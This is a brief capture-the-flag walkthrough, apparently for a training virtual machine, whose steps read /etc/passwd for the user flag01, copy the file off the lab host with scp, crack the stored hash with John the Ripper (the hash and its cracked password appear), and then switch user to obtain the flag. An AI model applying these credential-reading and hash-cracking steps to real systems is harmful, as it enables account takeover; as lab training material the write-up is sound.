# Check encrypted passwords
`cat /etc/passwd | grep flag01`

# Download file to have root permissions on local machine
`scp -P 4242 level01@192.168.56.101:/etc/passwd .`

# Use John the Ripper to crack the password
`john passwd`
`42hDRfypTqqnw` -> `abcdefg`

# Switch user and get the flag
```bash
su flag01
getflag```
